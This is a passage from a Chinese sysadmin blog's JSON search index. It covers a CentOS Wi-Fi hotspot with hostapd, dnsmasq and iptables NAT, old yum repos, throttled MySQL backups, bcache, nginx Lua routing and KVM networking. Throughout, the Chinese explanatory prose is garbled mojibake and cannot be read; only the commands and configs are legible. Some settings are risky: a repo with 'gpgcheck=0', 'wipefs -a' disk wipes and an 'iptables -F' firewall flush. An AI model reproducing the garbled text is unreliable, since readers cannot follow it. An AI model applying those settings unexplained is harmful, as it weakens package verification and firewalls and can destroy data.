é‡å¯æå®šï¼\n","date":"2024-01-24","img":"","permalink":"https://rendoumi.com/posts/20240124-ext4_resize/","series":null,"tags":null,"title":"Ext4åˆ†åŒºçš„ç¼©å°"},{"categories":null,"content":"è‡ªå·±çš„ç¬”è®°æœ¬æ˜¯è£…äº†ä¸ªCentOSçš„ç³»ç»Ÿï¼Œç„¶åä¸Šé¢è·‘äº†ä¸ªVmwareï¼Œåˆè£…äº†Win10ï¼Œç„¶åæ¥ä¸¤ä¸ªå±å¹•ï¼Œå°çš„æ˜¯linuxè·‘gnomeï¼Œå¤§çš„æ˜¯Win10å±å¹•ï¼Œè¿™æ ·å¹²æ´»çš„ã€‚\nè·¯ç”±æ›´æ˜¯æ··ä¹±æ— æ¯”ï¼Œç½‘å¡æœ‰tun0 / wlan0 / eth0 ï¼Œæ²¡æœ‰å¼„br0ï¼Œè¿™æ˜¯å¤§å‰æã€‚å¦‚æœå¼„br0çš„è¯ï¼Œå¾—æ”¹ä¸€å †ä¸œè¥¿ã€‚\nè¿™æ ·çš„è¯wlan0æ— çº¿ç½‘å¡ä¸è”ç½‘å°±ç©ºé—²äº†ï¼Œäºæ˜¯æƒ³æŠŠæ— çº¿ç½‘å¡åšAPå…±äº«å‡ºæ¥ï¼Œç»™æ‰‹æœºç”¨ï¼Œåšæ³•çœŸæ˜¯æ¯”è¾ƒå¤æ‚ï¼Œå¼„äº†2å¤©æ‰å¼„å¥½ï¼Œç½‘ä¸Šçš„æ•™ç¨‹éƒ½æ˜¯è«åå•Šï¼Œä¸å¤ªé€‚åˆCentOSã€‚\nå…¶å®å°±æ˜¯å®‰è£…hostpapdï¼ŒæŠŠåšæ³•è®°å½•ä¸€ä¸‹ï¼š\né¦–å…ˆä¸æƒ³æ”¹åŠ¨å·²æœ‰çš„ç½‘ç»œï¼Œé‚£ä¹ˆæ¡¥æ¥è¿™æ¡è·¯å°±å½»åº•æ–­äº†ï¼Œåªèƒ½åœ¨æ— çº¿ç½‘å¡ä¸ŠåšDHCP+NATä¸€æ¡è·¯äº†ã€‚\nå…ˆæ£€æŸ¥ç½‘ç»œï¼š\n1lspci -k | grep -A 3 -i \u0026#34;network\u0026#34; 203:00.0 Network controller: Qualcomm Atheros QCA9565 / AR9565 Wireless Network Adapter (rev 01) 3 Subsystem: Lite-On Communications Inc Device 0662 4 Kernel driver in use: ath9k 5 Kernel modules: ath9k çœ‹åˆ°è‡ªå·±çš„ç½‘å¡é©±åŠ¨æ˜¯ath9kï¼Œå†çœ‹çœ‹æ¨¡å—\n1modinfo ath9k | grep \u0026#39;depend\u0026#39; 2depends: mac80211,ath9k_hw,ath9k_common,cfg80211,ath mac80211, cfg80211çœ‹åˆ°è¿™ä¸ªå°±æ”¾å¿ƒäº†ï¼Œdriverå°±æ˜¯nl80211\nå†ç¡®è®¤ä¸€ä¸‹ï¼Œé‡Œé¢æœ‰* AP å­—æ ·è¿™æ ·å°±æ²¡é—®é¢˜äº†ï¼š\n1iw list|grep -A8 \u0026#34;Supported interface modes:\u0026#34; 2 Supported interface modes: 3 * IBSS 4 * managed 5 * AP 6 * AP/VLAN 7 * WDS 8 * monitor 9 * P2P-client 10 * P2P-GO é¦–å…ˆçœ‹çœ‹è‡ªå·±çš„æ— çº¿ç½‘å¡ç‰©ç†åœ°å€ï¼Œ30:10:B3:6A:22:AAè®°ä¸‹æ¥\n1ifconfig -a 2...... 3wlan0 Link encap:Ethernet HWaddr 30:10:B3:6A:22:AA 4...... å†çœ‹çœ‹è‡ªå·±çš„ç¼ºçœè·¯ç”±ç½‘å¡ï¼Œæ˜¯è™šæ‹Ÿç½‘å¡tun0ï¼Œä¹Ÿè®°ä¸‹æ¥\n1route -n 2...... 30.0.0.0 10.10.0.9 0.0.0.0 UG 0 0 0 tun0 4...... ä¸‹è½½hostapdå¹¶å®‰è£…ï¼Œå¦‚æœæç¤ºlibnlæ²¡è£…ï¼Œé‚£å°±è¡¥è£…ä¸€ä¸‹\n1wget http://mirrors.ustc.edu.cn/epel/6/x86_64/hostapd-2.0-7.el6.x86_64.rpm 2yum -y install hostapd-2.0-7.el6.x86_64.rpm ç¦æ­¢æ‰NetworkManagerå¯¹æ— çº¿ç½‘å¡çš„ç®¡ç†\n1vi /etc/NetworkManager/NetworkManager.conf 2...... 3#åœ¨æ–‡ä»¶æœ€ååŠ ä¸¤è¡Œ 4[keyfile] 5unmanaged-devices=mac:30:10:B3:6A:22:AA ç„¶åç¬é—´å¤§å®¶å°±å¯ä»¥åœ¨gnomeçš„æ¡Œé¢ç½‘å¡é‡Œçœ‹åˆ°æ— çº¿ç½‘å¡å¤±è”äº†ï¼Œè¿™å°±å¯¹äº†ï¼\nç¼–è¾‘/etc/hostapd/hostapd.conf\n1vi /etc/hostapd/hostapd.conf 2interface=wlan0 3driver=nl80211 4ssid=dontMessWithVincentValentine 5hw_mode=g 6channel=6 7macaddr_acl=0 8auth_algs=1 9ignore_broadcast_ssid=0 10wpa=3 11wpa_passphrase=KeePGuessinG 12wpa_key_mgmt=WPA-PSK 13wpa_pairwise=TKIP 14rsn_pairwise=CCMP æ³¨æ„ï¼Œä¸Šé¢hwmodeæ˜¯æ— çº¿å·¥ä½œçš„æ¨¡å¼ï¼Œgã€bã€aéƒ½å¯ä»¥ï¼Œä¸€èˆ¬æ˜¯gï¼Œchannelæ˜¯ä¿¡é“ï¼Œæ‰¾ä¸ªæ²¡å¤šå°‘äººç”¨çš„ä¿¡é“æœ€å¥½ï¼Œ11ã€6ã€3ã€1éƒ½å¯ä»¥ã€‚interfaceå°±æ˜¯æ— çº¿ç½‘å¡äº†ï¼Œwlan0ã€‚ssidå’ŒwpapassphraseæŒ‰ä½ çš„éœ€æ±‚æ¥è®¾ç½®å³å¯ã€‚\nokï¼Œç„¶åè¿è¡Œ:\n1rfkill unblock all rfkillæ˜¯æ§åˆ¶æ— çº¿å’Œè“ç‰™çš„å¼€å…³ï¼Œæˆ‘ä»¬æ”¾è¡Œä¸€åˆ‡ï¼Œå¦åˆ™hostapdæ— æ³•å¯åŠ¨ã€‚\nç°åœ¨ï¼Œå¯åŠ¨hostaptæµ‹è¯•ä¸€ä¸‹\n1hostapd /etc/hostapd/hostapd.conf æ²¡æœ‰æ„å¤–çš„è¯ï¼Œå°±åº”è¯¥æˆåŠŸäº†ã€‚ä½†è¿™åªæ˜¯åšäº†ä¸€åŠï¼Œé¦–å…ˆæ”¹æ”¹dnsmasqï¼Œç»™æ— çº¿ç½‘å¡åˆ†é…åœ°å€\n1vi /etc/dnsmasq.conf 2interface=wlan0 3bind-interfaces 4listen-address=192.168.0.1 5#no-dhcp-interface= 6dhcp-range=192.168.0.2,192.168.0.224,12h 7dhcp-option=3,192.168.0.1 8dhcp-option=6,223.5.5.5 æ³¨æ„ï¼Œæˆ‘çš„dnsmasq.confå°±åªæœ‰è¿™ä¹ˆ7è¡Œï¼Œæ²¡æœ‰åˆ«çš„äº†ã€‚é‡Œé¢å¾ˆç®€å•ï¼Œé¦–å…ˆdhcpæ˜¯æ”¾åˆ°äº†wlan0ä¸Šå¹¶åˆ†é…åœ°å€ï¼Œdhcp-optionä¸­3è¡¨ç¤ºç½‘å…³ï¼Œgatewayï¼›6è¡¨ç¤ºdnsï¼Œè¿™é‡Œè®¾ç½®çš„æ˜¯é˜¿é‡Œçš„å…¬å…±dns 223.5.5.5ã€‚\nå‰©ä¸‹çš„æˆ‘ä»¬å°±å†™ä¸ªè„šæœ¬æ¥å®Œæˆå§ï¼š å†…å®¹å…¶å®å°±æ˜¯\nè§£é™¤æ— çº¿block é…ç½®wlan0çš„ipä¸º192.168.0.1 å¯åŠ¨dnsmasq åšiptableçš„nat æ³¨æ„é‡Œé¢æˆ‘æ˜¯ç”¨çš„tun0ï¼Œå¦‚æœä½ çš„ç¼ºçœè·¯ç”±æ˜¯eth0ï¼Œæ”¹äº†å³å¯ã€‚ 1vi /usr/local/bin/initSoftAP.sh 2#!/bin/bash 3 4start() { 5rfkill unblock all 6ifconfig wlan0 up 192.168.0.1 netmask 255.255.255.0 7sleep 2 8 9if [ -z \u0026#34;$(ps -e | grep dnsmasq)\u0026#34; ] 10then 11 dnsmasq 12fi 13 14#Enable NAT 15iptables -F 16iptables -X 17iptables -t nat -A POSTROUTING -o tun0 -j MASQUERADE 18 19#Thanks to lorenzo 20#Uncomment the line below if facing problems while sharing PPPoE, see lorenzo\u0026#39;s comment for more details 21#iptables -I FORWARD -p tcp --tcp-flags SYN,RST SYN -j TCPMSS --clamp-mss-to-pmtu 22 23sysctl -w net.ipv4.ip_forward=1 24 25#start hostapd 26hostapd -B /etc/hostapd/hostapd.conf 27} 28 29stop() { 30service iptables stop 31service dnsmasq stop 32pkill hostapd 33/sbin/ip link set down dev wlan0 34} 35 36case $1 in 37 start) 38 start 39 ;; 40 stop) 41 stop 42 ;; 43 *) 44 echo \u0026#34;Usage: $0 {start|stop}\u0026#34; 45 exit 2 46esac ok, è¿™ä¹ˆå°±æå®šäº†ã€‚\n1#å¯åŠ¨ 2/usr/local/bin/initSoftAP.sh start 3 4#åœæ­¢ 5/usr/local/bin/initSoftAP.sh stop ","date":"2024-01-23","img":"","permalink":"https://rendoumi.com/posts/20240123-centos_wifiap/","series":null,"tags":null,"title":"CentOSä¸‹åšæ— çº¿APçƒ­ç‚¹"},{"categories":null,"content":"å‰åŒäº‹Nå¹´å‰ä¹°äº†ä¸ªlinodeçš„ä¸»æœºï¼Œä¸€ç›´ç”¨ï¼Œç³»ç»Ÿæ˜¯CentOS 5.6 x86_64çš„ã€‚\nç°åœ¨æƒ³åœ¨ä¸Šé¢è£…ä¸ªè½¯ä»¶ï¼Œç»“æœyumå¤±æ•ˆäº†ï¼Œé‡è£…ç³»ç»Ÿä¸å¯èƒ½ï¼Œåªèƒ½æ‰¾ä¸ªæ—§çš„yumæºè®¾ç½®ä¸€ä¸‹äº†ã€‚\næºï¼š http://vault.centos.org ï¼Œæ‰¾åˆ°å­ç›®å½•\n1cat /etc/yum.repos.d/base.repo 2[base] 3name=base 4baseurl=http://vault.centos.org/5.6/os/x86_64/ 5gpgcheck=0 6enabled=1 æœ€åæ¸…æ‰ä¸€ä¸‹ç¼“å­˜å°±å¯ä»¥äº†\n1yum clean all ","date":"2024-01-23","img":"","permalink":"https://rendoumi.com/posts/20240123-centos_yum_old/","series":null,"tags":null,"title":"ç»™è€æ—§çš„CentOSç³»ç»Ÿè®¾ç½®yumæº"},{"categories":null,"content":"å…¬å¸çš„MySQLæœåŠ¡å™¨å®šæ—¶åœ¨å‡Œæ™¨4:00å‡†æ—¶å¼€å§‹å¤‡ä»½ã€‚\nç»“æœæ˜¯ä¼šè§¦å‘æŠ¥è­¦ï¼Œnetæµé‡å¢é«˜ï¼Œcpuå¢é«˜ï¼Œç£ç›˜ioå¢é«˜ï¼Œè¿™ä¸ªæ˜¯å±äºæ­£å¸¸çš„ï¼Œå¦‚ä½•é¿å…è§¦å‘è­¦æŠ¥å‘¢ï¼Ÿ\næœ‰4ç§æ–¹æ³•ï¼š\nä¸€ã€ä¼˜åŒ–ioå’Œcpuï¼Œè®©å¤‡ä»½å†™ç£ç›˜çš„é€Ÿåº¦é™ä¸‹æ¥ï¼Œå¹³ç¨³çš„å†™å…¥ 1nice -n 10 ionice -c2 -n 7 /usr/bin/mysqldump -S /var/lib/mysql/mysql.sock -uroot --single-transaction --quick\\ 2 --triggers -R --hex-blob --log-error=$db.log --databases $db \u0026gt; $basedir/$backdir/$db.sql äºŒã€åŠ å¿«å¤‡ä»½é€Ÿåº¦ï¼Œå¤šçº¿ç¨‹ï¼Œè®©æŠ¥è­¦è§¦å‘ä¹‹å‰å°±ç»“æŸå¤‡ä»½ 1COMMIT_COUNT=0 2COMMIT_LIMIT=10 3for DB in `cat ListOfDatabases.txt` 4do 5 mysqldump -h... -u... -p... --hex-blob --routines --triggers ${DB} | gzip \u0026gt; ${DB}.sql.gz \u0026amp; 6 (( COMMIT_COUNT++ )) 7 if [ ${COMMIT_COUNT} -eq ${COMMIT_LIMIT} ] 8 then 9 COMMIT_COUNT=0 10 wait 11 fi 12done 13if [ ${COMMIT_COUNT} -gt 0 ] 14then 15 wait 16fi ä¸‰ã€ç”¨cstreamæ¥æ§åˆ¶æµé€Ÿ -t = throughput in bytes/sec 1000000æ˜¯ä¸€å…†ï¼Œæ¯ç§’åªå…è®¸å†™ä¸€å…†\n1mysqldump --single-transaction --quick -u \u0026lt;USER\u0026gt; -p\u0026lt;PASS\u0026gt; \u0026lt;Database\u0026gt; | cstream -t 1000000 \u0026gt; backup.sql å››ã€ç”¨pvæ¥æ§åˆ¶æµé€Ÿ \u0026ndash;rate-limit Limit the transfer to a maximum of RATE bytes per second. å•ä½å¯ä»¥æ˜¯ï¼š1k 1m 1g 1t\n1mysqldump --single-transaction --quick -u -p | pv --rate-limit 1m \u0026gt; db.sql ","date":"2024-01-23","img":"","permalink":"https://rendoumi.com/posts/20240123-mysql_backup_optimize/","series":null,"tags":null,"title":"MySQLçš„å¤‡ä»½ç½‘ç»œä¼˜åŒ–"},{"categories":null,"content":"å…¬å¸çš„Dell R720XDæœåŠ¡å™¨æ˜¯ç”¨æ¥åšHadoopå¤§æ•°æ®çš„ã€‚\nå…¶ä¸­æœ‰ä¸¤å—300Gçš„ç¡¬ç›˜åšRaid1ï¼Œä½œä¸ºç³»ç»Ÿç›˜ã€‚\nå‰©ä¸‹3å—ç¡¬ç›˜æ˜¯4TBï¼Œéƒ½æ˜¯ç‹¬ç«‹çš„ï¼Œæ²¡æœ‰åšä»»ä½•Raidï¼Œå•ç‹¬åšæ•°æ®ç›˜ã€‚\nä½†æ˜¯ï¼Œè¿™ä¸‰å—ç¡¬ç›˜éƒ½è¢« Dell H330 çš„Raidæ§åˆ¶å™¨æ§åˆ¶ï¼Œäºæ˜¯3å—ç¡¬ç›˜å‘¢ï¼Œå…¶å®æ¯ä¸ªéƒ½æ˜¯ä¸ªå•ç‹¬çš„ Raid0\nå»æœºæˆ¿å·¡æ£€çš„è¿‡ç¨‹ä¸­ï¼Œå‘ç°ä¸€ä¸ªç¡¬ç›˜äº®é»„ç¯ã€‚\nä»idracå£å¯ä»¥çœ‹åˆ°åäº†ä¸ªç¡¬ç›˜\né—®é¢˜æ¥äº†ï¼Œä¸‰å—å•Šï¼Œåˆ°åº•æ˜¯å“ªå—åäº†å‘¢ï¼Ÿ\næ³¨æ„ä¸Šå›¾ï¼Œä¿®è®¢æ˜¯ï¼šGS0Fï¼Œåºåˆ—å·æ˜¯ï¼šZ1Z83DXH\næˆ‘äº†ä¸ªæ“¦ï¼Œæ‰€æœ‰ç¡¬ç›˜éƒ½è¢«h330æ¥ç®¡ï¼Œæ‰€ä»¥lspciä»€ä¹ˆä¹Ÿçœ‹ä¸å‡ºæ¥ï¼Œåªèƒ½çœ‹å‡ºæ˜¯ä¸ªlsiçš„MegaRAIDï¼ï¼ï¼\n1lspci|grep Mega 202:00.0 RAID bus controller: LSI Logic / Symbios Logic MegaRAID SAS-3 3008 [Fury] (rev 02) æ²¡åŠæ³•ï¼Œå…ˆå»ä¸‹ä¸ªMegaCLIå§: MegaCli.tgz 1cd /opt/MegaRAID 2tar zxvf MegaCli.tgz å†ä¸‹ä¸ªpython, mega-status.py 1chmod 755 mega-status.py 2./mega-status.py æ³¨æ„è¿™ä¸ªè„šæœ¬æ˜¯å¼•ç”¨äº†64ä½çš„megacli\n1def_megaclipath = \u0026#34;/opt/MegaRAID/MegaCli/MegaCli64\u0026#34; çœ‹è¿è¡Œç»“æœå•Š\nè¿™é‡ŒæŠŠä¿®è®¢å’Œåºåˆ—å·è¿åœ¨ä¸€èµ·äº†ï¼š GS0FZ1Z83DXH å¯¹åº”c0u2p0ï¼Œå¯¹åº”ä¸Šé¢çš„c0u2ï¼Œå¯¹åº”å³è¾¹çš„/dev/sdc\næ‰€ä»¥æ˜¯/dev/sdcåæ‰äº†ã€‚\næå®šã€‚\nè¿™æ ·å°±å¯ä»¥å…ˆå¸è½½/dev/sdcï¼Œç„¶åæ¢ç›˜äº†ã€‚\n","date":"2024-01-23","img":"","permalink":"https://rendoumi.com/posts/20240123-dell_disk/","series":null,"tags":null,"title":"Dell R730XDæœåŠ¡å™¨å¦‚ä½•ç¡®å®šæ˜¯å“ªå—ç¡¬ç›˜åäº†"},{"categories":null,"content":"NodeJSé»˜è®¤64ä½æœºå™¨GCæ˜¯æœ‰1.4Gå†…å­˜ï¼Œæ‰€ä»¥ï¼Œå¦‚æœæ˜¯512æˆ–è€…128å…†å†…å­˜çš„å°vpsï¼Œç«‹æ—¶å°±ä¸çµäº†ã€‚\néœ€è¦åŠ å‚æ•°\n1--max_old_space_size=128 --optimize_for_size ä¸€å¥è¯æå®šã€‚\n","date":"2024-01-23","img":"","permalink":"https://rendoumi.com/posts/20240123-nodejs_gc/","series":null,"tags":null,"title":"å°å¾®vpsä¸‹è¿è¡Œnodejséœ€è¦æ³¨æ„çš„gc"},{"categories":null,"content":" å¦‚ä¸Šå›¾ï¼Œæ•°æ®å†™åˆ°ç¡¬ç›˜æœ‰ä¸¤ç§æ–¹å¼ï¼Œä¸€ç§æ˜¯Bcacheç”¨SSDåšç¼“å†²ï¼ŒåŠ é€Ÿæœ€åçš„ç¡¬ç›˜è¯»å†™ã€‚å¦ä¸€ç§æ˜¯ç›´æ¥è¯»å†™ç¡¬ç›˜ï¼Œbypassæ¨¡å¼ã€‚æˆ‘ä»¬ç”¨çš„æ˜¯ç¬¬ä¸€ç§Bcacheã€‚\nå®‰è£…ï¼š\n1$ yum install bcache-tools /dev/sdaæ˜¯ç¡¬ç›˜ï¼Œ/dev/sdbæ˜¯ssdï¼Œ é¦–å…ˆæŠŠä¸¤ä¸ªç›˜çš„æ•°æ®éƒ½æ“¦å¹²å‡€äº†\n1$ wipefs -a /dev/sda1 ; wipefs -a /dev/sdb1 æ ¼å¼åŒ–hddå’Œssdï¼Œæ³¨æ„å‚æ•°ä¸åŒ\n1$ make-bcache -B /dev/sda1 ; make-bcache -C /dev/sdb1 æŒ‚æ¥bcache0\n1$ echo C_Set_UUID_VALUE \u0026gt; /sys/block/bcache0/bcache/attach 2$ mkfs.ext4 /dev/bcache0 3$ mount /dev/bcache0 /mnt ä¿®æ”¹ç¡¬ç›˜å†™çš„æ–¹æ³•ï¼Œæ”¹æˆwriteback(åŸæ¥æ˜¯writethrough)\n11.ä¸´æ—¶ç”Ÿæ•ˆçš„æ–¹æ³•ï¼ˆé‡å¯å¤±æ•ˆï¼‰ 2$ echo writeback \u0026gt; /sys/block/bcache0/bcache/cache_mode 3 42.æ°¸ä¹…ç”Ÿæ•ˆçš„æ–¹æ³• 5$ echo /dev/sda1 \u0026gt; /sys/fs/bcache/register æœ€åæŸ¥çœ‹ä¸€ä¸‹çŠ¶æ€ï¼š\n1$ bcache-status -s ","date":"2024-01-23","img":"","permalink":"https://rendoumi.com/posts/20240123-ssd_cache/","series":null,"tags":null,"title":"åœ¨linuxä¸‹ç”¨SSDç›˜æ¥åŠ é€ŸHDDç¡¬ç›˜"},{"categories":null,"content":"æœåŠ¡å™¨è¦è·‘dnsmasqï¼ŒåŒæ—¶æœºå™¨è¿˜è·‘ç€kvmï¼Œå’Œlibvirtdè‡ªå¸¦dnsmasqçš„å†²çªäº†ï¼Œéœ€è¦ç¦æ‰libvirtdçš„ã€‚\næ–¹æ³•å¾ˆç®€å•ï¼Œå¦‚ä¸‹ï¼š\n1virsh net-list 2 3Name State Autostart Persistent 4-------------------------------------------------- 5default active yes yes 6 7virsh net-autostart --disable default 8virsh net-destroy default æå®š.\n","date":"2024-01-23","img":"","permalink":"https://rendoumi.com/posts/20240123-kvm_disable_dnsmasq/","series":null,"tags":null,"title":"å¦‚ä½•ç¦æ­¢libvirtdè‡ªå¸¦çš„dnsmasqå¯åŠ¨"},{"categories":null,"content":"å…¬å¸çš„çº¿ä¸Šç¯å¢ƒåˆ†ä¸ºé¢„å‘å¸ƒå’Œæ­£å¼ä¸¤ä¸ªéƒ¨åˆ†ã€‚\nå…¶å®ä¸¤ä¸ªéƒ¨åˆ†æ˜¯å…¬ç”¨ä¸€ä¸ªNginxå‰ç«¯çš„ã€‚\nè¿™æ ·æ€ä¹ˆåˆ†å‘å‘¢ï¼Ÿ\nç”¨luaå³å¯ï¼Œå¦‚æœæ˜¯å…¬å¸æ¥çš„æŸä¸ªå›ºå®šipï¼Œåˆ™åˆ†å‘åˆ°é¢„å‘å¸ƒï¼Œå¦‚æœä¸æ˜¯ï¼Œå°±èµ°æ­£å¼ç¯å¢ƒã€‚è¿™æ ·æµ‹è¯•å°±ç®€å•å¤šäº†ï¼Œè¿ç»´ç»Ÿä¸€è®¾ç½®ä¸€ä¸ªæ— çº¿wifiï¼Œæ¥å…¥è¿™ä¸ªwifiå°±èµ°æŸä¸ªå›ºå®šipï¼Œåˆ°çš„å…¨æ˜¯é¢„å‘å¸ƒç¯å¢ƒï¼Œä¸ç”¨è¿™ä¸ªwifiå°±èµ°æ­£å¼ç¯å¢ƒï¼Œéå¸¸æ–¹ä¾¿æµ‹è¯•ã€‚\nç”¨luaè¿›è¡Œåˆ†å‘ï¼š\n1location / { 2 content_by_lua \u0026#39; 3 myIP = ngx.req.get_headers()[\u0026#34;X-Real-IP\u0026#34;] 4 if myIP == nil then 5 myIP = ngx.req.get_headers()[\u0026#34;x_forwarded_for\u0026#34;] 6 end 7 if myIP == nil then 8 myIP = ngx.var.remote_addr 9 end 10 if myIP == \u0026#34;å…¬å¸å‡ºå£IP\u0026#34; then 11 ngx.exec(\u0026#34;@client\u0026#34;) 12 else 13 ngx.exec(\u0026#34;@client_test\u0026#34;) 14 end 15 \u0026#39;; 16} 17 18location @client{ 19 proxy_next_upstream error timeout; 20 proxy_redirect off; 21 proxy_set_header Host $host; 22 #proxy_set_header X-Real-IP $remote_addr; 23 proxy_set_header X-Real-IP $http_x_forwarded_for; 24 proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; 25 client_max_body_size 100m; 26 client_body_buffer_size 256k; 27 proxy_connect_timeout 180; 28 proxy_send_timeout 180; 29 proxy_read_timeout 180; 30 proxy_buffer_size 8k; 31 proxy_buffers 8 64k; 32 proxy_busy_buffers_size 128k; 33 proxy_temp_file_write_size 128k; 34 proxy_pass http://client; 35 36} 37location @client_test{ 38 proxy_next_upstream error timeout; 39 proxy_redirect off; 40 proxy_set_header Host $host; 41 #proxy_set_header X-Real-IP $remote_addr; 42 proxy_set_header X-Real-IP $http_x_forwarded_for; 43 proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; 44 client_max_body_size 100m; 45 client_body_buffer_size 256k; 46 proxy_connect_timeout 180; 47 proxy_send_timeout 180; 48 proxy_read_timeout 180; 49 proxy_buffer_size 8k; 50 proxy_buffers 8 64k; 51 proxy_busy_buffers_size 128k; 52 proxy_temp_file_write_size 128k; 53 proxy_pass http://client_test; 54} ","date":"2024-01-23","img":"","permalink":"https://rendoumi.com/posts/20240123-lua_ip_forward/","series":null,"tags":null,"title":"Nginxä¸‹luaæ ¹æ®å®¢æˆ·ç«¯ipè¿›è¡Œåˆ†å‘"},{"categories":null,"content":"æŠ€æœ¯è¦æ±‚å¾ˆç®€æ˜ï¼š\nnginxåˆ†å‘è¯·æ±‚çš„æ—¶å€™ï¼Œupstreamæ˜¯ç”±luaä»redisä¸­è¯»å–é…ç½®åŠ¨æ€ç”Ÿæˆçš„ï¼Œè¿™æ ·ä¾¿äºç”¨ç¨‹åºåŠ¨æ€ä¿®æ”¹ã€‚\nè£…å¥½nginx+luaï¼Œè¿‡ç¨‹ä¸è¡¨ã€‚ æŠŠlua redisçš„æ¨¡å—é…åˆ°è·¯å¾„ä¸­\n1wget https://raw.github.com/nrk/redis-lua/version-2.0/src/redis.lua nginxé…ç½®å¦‚ä¸‹ï¼š\n1server { 2 listen 80; 3 server_name _; 4 server_name_in_redirect off; 5 port_in_redirect off; 6 root /root/html; 7 8 location / { 9 set $upstream \u0026#34;\u0026#34;; 10 rewrite_by_lua \u0026#39; 11 -- load global route cache into current request scope 12 -- by default vars are not shared between requests 13 local routes = _G.routes 14 15 -- setup routes cache if empty 16 if routes == nil then 17 routes = {} 18 ngx.log(ngx.ALERT, \u0026#34;Route cache is empty.\u0026#34;) 19 end 20 21 -- try cached route first 22 local route = routes[ngx.var.http_host] 23 if route == nil then 24 local redis = require \u0026#34;redis\u0026#34; 25 local client = redis.connect(\u0026#34;localhost\u0026#34;, 6379) 26 route = client:get(ngx.var.http_host) 27 end 28 29 -- fallback to redis for lookups 30 if route ~= nil then 31 ngx.var.upstream = route 32 routes[ngx.var.http_host] = route 33 _G.routes = routes 34 else 35 ngx.exit(ngx.HTTP_NOT_FOUND) 36 end 37 \u0026#39;; 38 39 proxy_buffering off; 40 proxy_set_header Host $host; 41 proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; 42 proxy_redirect off; 43 proxy_connect_timeout 10; 44 proxy_send_timeout 30; 45 proxy_read_timeout 30; 46 proxy_pass http://$upstream; 47 } 48} é€è¿›redisä¸€äº›æ•°æ®\n1redis-cli =\u0026gt; 2SET localhost 127.0.0.1:49153 æµ‹è¯•ä¸€ä¸‹ï¼š\n1curl -i -X HEAD \u0026#34;http://127.0.0.1/\u0026#34; # -\u0026gt; 404ï¼Œæ²¡è¿™ä¸ªåŸŸå 2curl -i -X HEAD \u0026#34;http://localhost/\u0026#34; # -\u0026gt; æ­£å¸¸ ","date":"2024-01-23","img":"","permalink":"https://rendoumi.com/posts/20240123-lua_redis_nginx_upstream/","series":null,"tags":null,"title":"Luaä¸redisç»“åˆåº”ç”¨äºnginxçš„åŠ¨æ€upstream"},{"categories":null,"content":"æ¯”è¾ƒå¤æ€ªçš„éœ€æ±‚ï¼Œå…¬å¸æ‹‰äº†æ ¹ä¸“çº¿åˆ°æœºæˆ¿ã€‚\nè€Œä½¿ç”¨ä¸“çº¿çš„æœºå™¨æ˜¯ä¸€å°kvmè™šæœºï¼Œå®ä½“æœºæœ‰è‡ªå·±çš„è·¯ç”±ï¼Œå®ä½“æœºçš„å‰ä¸¤ä¸ªç½‘å¡åšäº†åŒç½‘å¡bondingã€‚\né‚£è™šæœºå°±åªèƒ½ä½¿ç”¨å®æœºçš„ç¬¬ä¸‰å—ç½‘å¡è¿å‡ºå»äº†ï¼Œè€Œä¸”å¿…é¡»åˆ¶å®šhostçš„è·¯ç”±ï¼Œè¿™é‡Œç»™çš„å­ç½‘æ©ç æ˜¯255.255.255.252ï¼Œåªæœ‰2ä¸ªipå¯ä»¥ç”¨ï¼Œæ‰€ä»¥åªèƒ½è™šæœºæœ‰ipï¼Œå®æœºæ ¹æœ¬ä¸èƒ½é…ipåœ°å€ï¼ï¼ï¼\né¦–å…ˆæŠŠå®æœºdell r720çš„ç¬¬ä¸‰å—ç½‘å¡em3æ”¹ä¸€ä¸‹ï¼Œè¿æ¥åˆ°ç½‘æ¡¥br1\n1cat /etc/sysconfig/network-scripts/ifcfg-em3 2DEVICE=em3 3HWADDR=XX:XX:XX:XX:XX:XX 4TYPE=Ethernet 5UUID=6b68220d-d5ed-496f-b8d1-4c6d9cbb1234 6ONBOOT=yes 7NM_CONTROLLED=no 8BRIDGE=br1 å†åšä¸ªç½‘æ¡¥br1\n1cat /etc/sysconfig/network-scripts/ifcfg-br1 2DEVICE=br1 3BOOTPROTO=none 4ONBOOT=yes 5TYPE=Bridge æ³¨æ„ï¼Œè¿™ä¸ªç‰©ç†æœºç½‘å¡å’Œç½‘æ¡¥éƒ½æ²¡æœ‰IPåœ°å€ï¼Œå®åœ¨æ˜¯å¯æ€œï¼Œipä¸å¤Ÿç”¨\nç„¶åå¯åŠ¨ä»–ä»¬ï¼š\n1ifup em3 2ifup br1 è™šæœºæŒ‚æ¥æ–°è®¾å¤‡ï¼š\n1virsh attach-interface --domain vis-16-13-28 \\ 2 --type bridge \\ 3 --source br1 --model virtio \\ 4 --mac f0:00:ac:30:2d:1d --config ç„¶åsshç™»å½•è™šæœºï¼Œé…ç½®å¥½è™šæœºä¸­eth1çš„ip/maskï¼Œä¸è¦é…gatewayå•Š\næœ€åç›´æ¥åŠ ä¸»æœºè·¯ç”±ï¼š\n1route add -host 172.17.11.182 dev eth1 pingä¸€ä¸‹å¯¹ç«¯172.17.11.182ï¼Œé€šå°±æå®šäº†ã€‚\n","date":"2024-01-23","img":"","permalink":"https://rendoumi.com/posts/20240123-kvm_netcard_attach/","series":null,"tags":null,"title":"Kvmçš„è™šæœºä¸­å¦‚ä½•åœ¨çº¿æŒ‚æ¥ä¸€å—æ–°ç½‘å¡"},{"categories":null,"content":"æœ€è¿‘åœ¨å¼„jenkinsçš„è‡ªåŠ¨æ‰“åŒ…éƒ¨ç½²\nå‡ºç°ä¸ªé—®é¢˜ï¼Œé¡¹ç›®æ˜¯ç”¨çš„mvnï¼Œæ‰“åŒ…çš„æ—¶å€™ï¼Œå¦‚æœæ˜¯åœ¨æ§åˆ¶å°ä¸‹è¿˜å¥½ã€‚\nå¦‚æœæ˜¯åœ¨jenkinsä¸‹ï¼Œçœ‹console outputï¼Œå¾€ä¸­å¿ƒä»“åº“artifactoryæäº¤åŒ…çš„æ—¶å€™ï¼Œä¼šæ˜¾ç¤ºä¸‹é¢ä¸€å †ï¼š\n1Uploaded: http://xxx:8081/artifactory/libs-release-local/abc/maven-metadata.xml (315 B at 17.1 KB/sec) 2Uploading: http://xxx:8081/artifactory/libs-release-local/abc/d/admin-9.1.war 320000/21969 KB 420002/21969 KB 520004/21969 KB 620006/21969 KB 720008/21969 KB 820010/21969 KB 920012/21969 KB 1020014/21969 KB 1120016/21969 KB 1220018/21969 KB 1320020/21969 KB 1420022/21969 KB 1520024/21969 KB 